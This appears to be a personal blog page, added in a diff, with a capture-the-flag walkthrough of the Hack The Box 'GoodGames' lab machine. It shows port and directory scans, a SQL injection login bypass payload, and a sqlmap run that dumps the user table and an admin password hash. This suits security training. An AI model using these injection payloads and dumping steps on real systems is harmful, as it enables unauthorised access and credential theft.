@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoodGames | RubberDuck9705</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --dark-green: #00cc33;
+            --bg-dark: #0a0e1a;
+            --bg-darker: #050810;
+            --text-primary: #e0e0e0;
+            --text-muted: #8892b0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: linear-gradient(135deg, var(--bg-darker) 0%, var(--bg-dark) 50%, #0d1929 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.8;
+        }
+
+        /* Animated grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.02) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Navigation */
+        nav {
+            position: relative;
+            z-index: 100;
+            padding: 2rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--neon-green);
+            text-decoration: none;
+            letter-spacing: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: var(--neon-green);
+        }
+
+        /* Back button */
+        .back-button {
+            position: relative;
+            z-index: 100;
+            padding: 1rem 5%;
+            margin-bottom: 2rem;
+        }
+
+        .back-button a {
+            display: inline-block;
+            color: var(--neon-green);
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-button a:hover {
+            transform: translateX(-5px);
+        }
+
+        /* Main content */
+        .writeup-container {
+            position: relative;
+            z-index: 10;
+            max-width: 900px;
+            margin: 0 auto 4rem;
+            padding: 3rem 5%;
+            background: rgba(10, 14, 26, 0.6);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+        }
+
+        /* Style all Notion content */
+        .notion-content h1,
+        .notion-content .page-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-green);
+            font-size: 2.5rem;
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 20px var(--neon-green);
+        }
+
+        .notion-content h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-green);
+            font-size: 1.8rem;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .notion-content h3 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--dark-green);
+            font-size: 1.4rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .notion-content p {
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            line-height: 1.8;
+        }
+
+        /* Code blocks - Strip all Notion styling and use plain text */
+        .notion-content pre,
+        .notion-content .code {
+            background: rgba(5, 8, 16, 0.95) !important;
+            border: 1px solid rgba(0, 255, 65, 0.3) !important;
+            border-left: 4px solid var(--neon-green) !important;
+            padding: 1.5rem !important;
+            overflow-x: auto !important;
+            margin: 1.5rem 0 !important;
+            border-radius: 0 !important;
+            white-space: pre-wrap !important;
+            word-wrap: break-word !important;
+        }
+
+        /* Remove ALL Notion code styling - including borders and backgrounds */
+        .notion-content pre *,
+        .notion-content .code * {
+            background: none !important;
+            background-color: transparent !important;
+            border: none !important;
+            border-top: none !important;
+            border-bottom: none !important;
+            border-left: none !important;
+            border-right: none !important;
+            box-shadow: none !important;
+            text-shadow: none !important;
+            filter: none !important;
+            opacity: 1 !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            color: var(--neon-green) !important;
+            font-family: 'Fira Code', monospace !important;
+            font-size: 0.9rem !important;
+            line-height: 1.6 !important;
+            font-weight: 400 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+            text-rendering: optimizeLegibility !important;
+        }
+
+        .notion-content code {
+            font-family: 'Fira Code', monospace !important;
+            color: var(--neon-green) !important;
+            background: none !important;
+            border: none !important;
+        }
+
+        /* Inline code in paragraphs */
+        .notion-content p code,
+        .notion-content li code {
+            background: rgba(0, 255, 65, 0.1) !important;
+            padding: 0.2rem 0.5rem !important;
+            border-radius: 3px !important;
+            border: 1px solid rgba(0, 255, 65, 0.3) !important;
+        }
+
+        /* Remove any weird Notion dividers/separators */
+        .notion-content pre hr,
+        .notion-content .code hr,
+        .notion-content pre div,
+        .notion-content .code div {
+            display: none !important;
+        }
+
+        /* Images */
+        .notion-content img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            margin: 1.5rem 0;
+            display: block;
+        }
+
+        .notion-content figure {
+            margin: 2rem 0;
+        }
+
+        /* Links */
+        .notion-content a {
+            color: var(--neon-green);
+            text-decoration: none;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .notion-content a:hover {
+            border-bottom-color: var(--neon-green);
+            text-shadow: 0 0 8px var(--neon-green);
+        }
+
+        /* Lists */
+        .notion-content ul,
+        .notion-content ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+
+        .notion-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Collapsible sections (details/summary) */
+        .notion-content details {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .notion-content summary {
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--neon-green);
+            font-family: 'Orbitron', sans-serif;
+            user-select: none;
+            font-size: 1.25rem;
+        }
+
+        .notion-content summary:hover {
+            text-shadow: 0 0 8px var(--neon-green);
+        }
+
+        /* Tables */
+        .notion-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .notion-content th,
+        .notion-content td {
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            padding: 0.75rem;
+            text-align: left;
+        }
+
+        .notion-content th {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--neon-green);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        /* Blockquotes */
+        .notion-content blockquote {
+            border-left: 4px solid var(--neon-green);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+
+        /* Footer */
+        footer {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2rem 5%;
+            border-top: 1px solid rgba(0, 255, 65, 0.1);
+            color: var(--text-muted);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .notion-content h1 {
+                font-size: 2rem;
+            }
+
+            .notion-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .writeup-container {
+                padding: 2rem 1rem;
+            }
+
+            .nav-links {
+                gap: 1.5rem;
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="index.html" class="logo">RUBBERDUCK9705</a>
+        <ul class="nav-links">
+            <li><a href="index.html#blog">BLOG</a></li>
+            <li><a href="index.html#labs">LABS</a></li>
+            <li><a href="index.html#htb">HTB WRITEUPS</a></li>
+            <li><a href="index.html#about">ABOUT</a></li>
+        </ul>
+    </nav>
+
+    <div class="back-button">
+        <a href="index.html#htb">← Back to HTB WriteUps</a>
+    </div>
+
+    <main class="writeup-container">
+        <div class="notion-content">
+<header><div class="page-header-icon undefined"><span class="icon">📚</span></div><h1 class="page-title" dir="auto">GoodGames</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8029-95cf-fcab692a6ab6" class="">Target : 10.129.200.195</p></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-80b5-81fd-f825a2c728b6" class="">
+</p></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Enumeration :</summary><div class="indented"><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Nmap</summary><div class="indented"><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8040-8dfe-fd9ca0f88860" class="">Enumeration/Discorvery of ports and services running on the endpoint :</p></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-80dc-a6e3-fb649154b485" class=""> </p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-8011-a600-fe0bd52dc84b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">nmap -sV -sC -O -T4 -p- 10.129.200.195
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 14:54 EDT
+Nmap scan report for 10.129.200.195
+Host is up (0.027s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds</code></pre></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Port 80 HTTP - WebApplication (Werkzeug) :</summary><div class="indented"><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-805d-b20d-ed549b891633" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)</code></pre></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-80df-8145-f21ab882bdf4" class="">The host is running a webserver on port 80 hosting Werkzeug which is a python libary.</p></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8087-ac90-de5529812b00" class="">We will begin directory enumeration of the page :</p></div><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-80ce-ba37-d27db4ee4653" class="image"><a href="image.png"><img style="width:654px" src="image.png"/></a></figure></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Gobuster (Directory Enumeration) :</summary><div class="indented"><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-80f6-9ea1-fbbe174534ef" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/Desktop/HTB/goodgames]
+└─$ gobuster dir -u http://10.129.200.195/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 9265
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.200.195/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          9265
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/blog                 (Status: 200) [Size: 44212]
+/forgot-password      (Status: 200) [Size: 32744]
+/login                (Status: 200) [Size: 9294]
+/logout               (Status: 302) [Size: 208] [--&gt; http://10.129.200.195/]
+/profile              (Status: 200) [Size: 9267]
+/server-status        (Status: 403) [Size: 279]
+/signup               (Status: 200) [Size: 33387]
+</code></pre></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Site technologies :</summary><div class="indented"><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-804f-861f-de2860fa6c72" class="image"><a href="image%201.png"><img style="width:461px" src="image%201.png"/></a></figure></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Nikto Scan :</summary><div class="indented"><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-80d2-9520-c63175cb2e4f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">nikto -h http://10.129.200.195/          
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.129.200.195
++ Target Hostname:    10.129.200.195
++ Target Port:        80
++ Start Time:         2025-09-11 15:40:51 (GMT-4)
+
+
+//Information gathered from Nikto Scan :
+Server banner changed from &#x27;Werkzeug/2.0.2 Python/3.9.2&#x27; to &#x27;Apache/2.4.51 (Debian)</code></pre></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">/login Page Burp Suite (SQLi) :</summary><div class="indented"><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-8049-bcbf-cefe66e1a4b3" class="image"><a href="image%202.png"><img style="width:463px" src="image%202.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="26bdd632-11a2-8089-a09e-ddcd1ea0e43c"/></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8025-babe-ea12a52decaf" class="">We attempted some SQL Injections using burp suite by capturing a POST-Request and sending it to Intrude. The launched a sniper attack with our wordlist of different sql injection payloads :</p></div><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-8044-8c73-f3938281e44a" class="image"><a href="image%203.png"><img style="width:625.984375px" src="image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8044-9af1-f35f9287a5de" class="">The following payload proved to be succesfull : </p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-8036-9cb7-ee1dc302d31a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">admin&#x27; or 1 = 1-- -</code></pre></div><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-80cc-a746-ed8cbd38713c" class="image"><a href="image%204.png"><img style="width:534px" src="image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-80a0-8f06-d7753a51a759" class="">By looking at the settings tab on the page it redirects us to another page. We can see it since we have to add it to our host file to be able to resolve that domain with an ip :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-8073-966c-df836beb7d5e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">echo &quot;10.129.200.195 internal-administration.goodgames.htb&quot; | sudo tee -a /etc/hosts</code></pre></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-8048-a370-eb31fc45c888" class="">After which we are meant with another login page : </p></div><div style="display:contents" dir="ltr"><figure id="26bdd632-11a2-804b-97e4-f81ef849b068" class="image"><a href="image%205.png"><img style="width:626px" src="image%205.png"/></a></figure></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">SQL Map to dump database:</summary><div class="indented"><div style="display:contents" dir="auto"><ol type="1" id="26bdd632-11a2-80e5-aa5e-cd6b55eefb47" class="numbered-list" start="1"><li>Create .req file with the http post request from burp suite :</li></ol></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-80a8-8b8f-ea3c3f3e43ca" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">POST /login HTTP/1.1
+Host: 10.129.200.195
+Content-Length: 37
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.129.200.195
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.200.195/signup
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+email=admin@goodgames.htb&amp;password=asdasd</code></pre></div><div style="display:contents" dir="auto"><ol type="1" id="26bdd632-11a2-80c4-bb83-dc222354f108" class="numbered-list" start="2"><li>Launch SQL map :</li></ol></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-80f9-8847-ebc28c39b009" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/Desktop/HTB/goodgames]
+└─$ sqlmap -r goodgames.req --dump
+        ___
+       __H__                                                                                      
+ ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                          
+|_ -| . [&#x27;]     | .&#x27;| . |                                                                         
+|___|_  [.]_|_|_|__,|  _|                                                                         
+      |_|V...       |_|   https://sqlmap.org                                                      
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:42:47 /2025-09-11/
+
+[16:42:47] [INFO] parsing HTTP request from &#x27;goodgames.req&#x27;
+[16:42:47] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[16:42:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@mail.com&#x27; AND (SELECT 6244 FROM (SELECT(SLEEP(5)))eezW) AND &#x27;pzxg&#x27;=&#x27;pzxg&amp;password=asdasd</code></pre></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-806e-9074-d232511003a5" class="">Results after dumping the MySQL - database :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26bdd632-11a2-80e0-830f-d4ff90e9b6bf" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">[16:43:10] [INFO] adjusting time delay to 1 second due to good response times
+main
+[16:43:19] [INFO] fetching tables for database: &#x27;main&#x27;
+[16:43:19] [INFO] fetching number of tables for database &#x27;main&#x27;
+[16:43:19] [INFO] retrieved: 3
+[16:43:22] [INFO] retrieved: blog
+[16:43:36] [INFO] retrieved: blog_comments
+[16:44:24] [INFO] retrieved: user
+[16:44:36] [INFO] fetching columns for table &#x27;user&#x27; in database &#x27;main&#x27;
+[16:44:36] [INFO] retrieved: 4
+[16:44:37] [INFO] retrieved: email
+[16:44:50] [INFO] retrieved: id
+[16:44:56] [INFO] retrieved: name
+[16:45:08] [INFO] retrieved: password
+[16:45:34] [INFO] fetching entries for table &#x27;user&#x27; in database &#x27;main&#x27;
+[16:45:34] [INFO] fetching number of entries for table &#x27;user&#x27; in database &#x27;main&#x27;
+[16:45:34] [INFO] retrieved: 1
+[16:45:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+admin
+[16:45:51] [INFO] retrieved: admin@goodgames.htb
+[16:46:57] [INFO] retrieved: 1
+[16:46:59] [INFO] retrieved: 2b22337f218b2d82dfc3b6f77e7cb8ec
+[16:48:43] [INFO] recognized possible password hashes in column &#x27;password&#x27;
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[16:48:55] [INFO] writing hashes to a temporary file &#x27;/tmp/sqlmapf4tn1xat68542/sqlmaphashes-z2jqv7vi.txt&#x27;                                                                                           
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[16:49:02] [INFO] using hash method &#x27;md5_generic_passwd&#x27;
+</code></pre></div></div></details></div></div></details></div></div></details></div><div style="display:contents" dir="auto"><p id="26bdd632-11a2-80ee-9038-d41385538962" class="">
+</p></div></div>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2025 RubberDuck9705 | GoodGames WriteUp</p>
+    </footer>
+</body>
+</html>
